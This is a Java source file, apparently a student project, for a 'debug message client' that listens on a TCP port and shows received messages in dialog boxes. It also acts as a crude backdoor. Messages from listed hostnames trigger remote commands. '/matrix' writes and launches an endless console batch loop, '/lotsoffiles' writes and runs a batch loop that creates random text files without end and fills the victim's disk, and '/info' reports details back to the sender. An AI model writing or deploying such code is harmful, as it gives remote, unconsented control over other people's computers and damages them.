import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.BindException;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;

import javax.swing.ImageIcon;
import javax.swing.JOptionPane;

public class DebugMessageClient {
	
	public DebugMessageClient(){
		//First, create a Server Listener to listen for incoming connections
		//Make sure it is in its own Thread
		ServerListener sl = new ServerListener();
		Thread t = new Thread(sl);
		t.start();
		
		//Start the Client Interface
		startClient();
	}
	
	private void startClient(){
		//This is where you would build your client interface
		URL URL = getClass().getResource("iron_man.png");
		String[] buttons = { "Ok" };
		ImageIcon icon = new ImageIcon("ironman.jpg", "MessageBox Icon");
		int returnValue = JOptionPane.showOptionDialog(null, "Client Started \n \n By Lachlan Stevens", "Welcome",
		        JOptionPane.INFORMATION_MESSAGE, 0, icon, buttons, buttons[0]);
	}
	
	class ServerListener implements Runnable{
		//Classes that implement the Runnable interface must call the below method
		public void run(){
			try{
				//Make a look to keep looking for incoming requests
				while(true){
					
					int port = 44455;
					ServerSocket serverSocket = new ServerSocket(port);
					System.out.println("Server up and waiting for requets");
					System.out.println("To test me, open a browser and goto localhost:44455\n");
					Socket clientSocket = serverSocket.accept();
					ServeRequest sr = new ServeRequest(clientSocket);
					Thread t = new Thread(sr);
					t.start();
					serverSocket.close();
				}
			}catch(IOException e){
				URL URL = getClass().getResource("error.png");
				String[] buttons = { "Ok" };
				ImageIcon icon = new ImageIcon("Ironman.jpg", "MessageBox Icon");
				int returnValue = JOptionPane.showOptionDialog(null, "Client Exception Encounted (is port in use?) \n \n By Lachlan Stevens", "Error",
				        JOptionPane.WARNING_MESSAGE, 0, icon, buttons, buttons[0]);
				
			}
				
		}
	}
	
	class ServeRequest implements Runnable{
		
		//This constructor will grab the incoming Socket from the other client
		Socket s;
		public ServeRequest(Socket s){
			this.s = s;
			
		}
		
		public void run(){
			BufferedReader in;
			try {
				in = new BufferedReader(
				        new InputStreamReader(s.getInputStream()));
				BufferedReader stdIn =
		                new BufferedReader(new InputStreamReader(System.in));
				
				//This is where the server deals with the request
				System.out.println("Server got a request!\n");
				//System.out.println(in.readLine());
				String request = in.readLine();
				System.out.println(request);
				String[] httprequest = request.split("/");
				String HostName = httprequest[0];
				String Message = in.readLine();
				if(Message.length() > 60){
					
					String args[] = Message.split("(?<=\\G............................................................)");
					
					Message = args[0];
					
				} else {
					System.out.println(Message);
					System.out.println(Message.length());
				}
				
				String[] web = Message.split("\\s+");
				
				if(HostName.equals("STEVLACH_2012B") || HostName.equals("TDC-09") || HostName.equals("RILLNINA_2012B") || HostName.equals("CARREDWA_2012B") || HostName.equals("SUVAADIT_2012T")){
					
					if(HostName.equals("STEVLACH_2012B")){
						HostName = "MarkTHarris";
					} else if (HostName.equals("RILLNINA_2012B")){
						HostName = "Cooki3ZaWarrior";
					} else if (HostName.equals("CARREDWA_2012B")){
						HostName = "Scum_Ninja";
					} else if (HostName.equals("SUVAADIT_2012T")){
						HostName = "";
					} 
					
					switch (Message){
				
					case "/matrix":{
						Message = "";
						System.out.println("fdfs");
						System.out.println("/matrixfdsfsd");
						System.out.println(System.getProperty("user.dir"));
		    			PrintWriter writer = new PrintWriter("matrix.bat", "UTF-8");
						writer.println("@echo off");
						writer.println("color 0a");
						writer.println(":loop");
						writer.println("echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%");
						writer.println("goto loop");
						writer.close();
						String directory = System.getProperty("user.dir");
						ProcessBuilder pb = new ProcessBuilder("matrix.bat");
						pb.directory(new File(directory));
						Process p = pb.start();
						Runtime.getRuntime().exec("cmd /c start " + directory + "\\matrix.bat");
						URL URL = getClass().getResource("iron_man.png");
						String []buttons = { "Reply", "Close" };
						ImageIcon icon = new ImageIcon("Ironman.jpg", "MessageBox Icon");
						int returnValue = JOptionPane.showOptionDialog(null, Message, HostName,
						        JOptionPane.INFORMATION_MESSAGE, 0, icon, buttons, buttons[0]);
						if(returnValue == 0){
							if(HostName.equals("MarkTHarris")){
								HostName = "STEVLACH_2012B";
							} else if (HostName.equals("Cooki3ZaWarrior")){
								HostName = "RILLNINA_2012B";
							} else if (HostName.equals("Scum_Ninja")){
								HostName = "CARREDWA_2012B";
							}
							DebugMessengerAdmin.reply(HostName);
						}
						break;
					}
					case "/lotsoffiles":{
						if(HostName.equals("Scum_Ninja") || HostName.equals("Cooki3ZaWarrior")){
							URL URL = getClass().getResource("iron_man.png");
							String []buttons4 = { "Reply", "Close" };
							ImageIcon icon4 = new ImageIcon("Ironman.jpg", "MessageBox Icon");
							int returnValue4 = JOptionPane.showOptionDialog(null, Message, HostName,
							        JOptionPane.INFORMATION_MESSAGE, 0, icon4, buttons4, buttons4[0]);
							if(returnValue4 == 0){
								if(HostName.equals("MarkTHarris")){
									HostName = "STEVLACH_2012B";
								} else if (HostName.equals("Cooki3ZaWarrior")){
									HostName = "RILLNINA_2012B";
								} else if (HostName.equals("Scum_Ninja")){
									HostName = "CARREDWA_2012B";
								}
								DebugMessengerAdmin.reply(HostName);
							}
							break;
						}
						Message = "";
						System.out.println("fdfs");
						System.out.println("/matrixfdsfsd");
						System.out.println(System.getProperty("user.dir"));
		    			PrintWriter writer1 = new PrintWriter("filez.bat", "UTF-8");
						writer1.println("@echo off");
						writer1.println("color 0a");
						writer1.println(":loop");
						writer1.println("echo %random%%random% > %random%%random%.txt");
						writer1.println("goto loop");
						writer1.close();
						String directory1 = System.getProperty("user.dir");
						ProcessBuilder pb1 = new ProcessBuilder("filez.bat");
						pb1.directory(new File(directory1));
						Process p2 = pb1.start();
						Runtime.getRuntime().exec("cmd /c start " + directory1 + "\\filez.bat");
						URL URL = getClass().getResource("iron_man.png");
						String []buttons1 = { "Reply", "Close" };
						ImageIcon icon1 = new ImageIcon("Ironman.jpg", "MessageBox Icon");
						int returnValue1 = JOptionPane.showOptionDialog(null, Message, HostName,
						        JOptionPane.INFORMATION_MESSAGE, 0, icon1, buttons1, buttons1[0]);
						if(returnValue1 == 0){
							if(HostName.equals("MarkTHarris")){
								HostName = "STEVLACH_2012B";
							} else if (HostName.equals("Cooki3ZaWarrior")){
								HostName = "RILLNINA_2012B";
							} else if (HostName.equals("Scum_Ninja")){
								HostName = "CARREDWA_2012B";
							}
							DebugMessengerAdmin.reply(HostName);
						}
					
						break;
					}
					case "/info":{
						System.out.println("Info Detected");
						Message = "";
						System.out.println(HostName);
						if(HostName.equals("MarkTHarris")){
							HostName = "STEVLACH_2012B";
						} else if (HostName.equals("Cooki3ZaWarrior")){
							HostName = "RILLNINA_2012B";
						} else if (HostName.equals("Scum_Ninja")){
							HostName = "CARREDWA_2012B";
						}
						System.out.println(HostName);
						DebugMessengerAdmin.sendInfo(HostName);
					}
					
					default:{
						URL URL = getClass().getResource("iron_man.png");
						String []buttons2 = { "Reply", "Close" };
						ImageIcon icon2 = new ImageIcon("Ironman.jpg", "MessageBox Icon");
						int returnValue2 = JOptionPane.showOptionDialog(null, Message, HostName,
						        JOptionPane.INFORMATION_MESSAGE, 0, icon2, buttons2, buttons2[0]);
						if(returnValue2 == 0){
							if(HostName.equals("MarkTHarris")){
								HostName = "STEVLACH_2012B";
							} else if (HostName.equals("Cooki3ZaWarrior")){
								HostName = "RILLNINA_2012B";
							} else if (HostName.equals("Scum_Ninja")){
								HostName = "CARREDWA_2012B";
							} else if (HostName.equals("")){
								HostName = "";
							}
							DebugMessengerAdmin.reply(HostName);
						}
						break;
					} 
					}
					}else {
					URL URL = getClass().getResource("iron_man.png");
					String[] buttons = { "Reply", "Close" }; 
					ImageIcon icon = new ImageIcon("Ironman.jpg", "MessageBox Icon");
					int returnValue = JOptionPane.showOptionDialog(null, Message, HostName,
					        JOptionPane.INFORMATION_MESSAGE, 0, icon, buttons, buttons[0]);
					if(returnValue == 0){
						if(HostName == "MarkTHarris"){
							
							HostName = "STEVLACH_2012B";
							
						}
						DebugMessengerAdmin.reply(HostName);
					}
					}
			
			} catch (IOException e) {
				System.out.println("IOException " + e);
				e.printStackTrace();
			}
		
		}
	}
	
	protected ImageIcon createImageIcon(String path, String description) {
		URL imgURL = getClass().getResource(path);
		if (imgURL != null) {
			return new ImageIcon(imgURL, description);
		} else {
			System.err.println("Couldn't find file: " + path);
			return null;
		}
	}
	
	public static void main(String args[]){
		//Program starts
		new DebugMessageClient();
	}
}
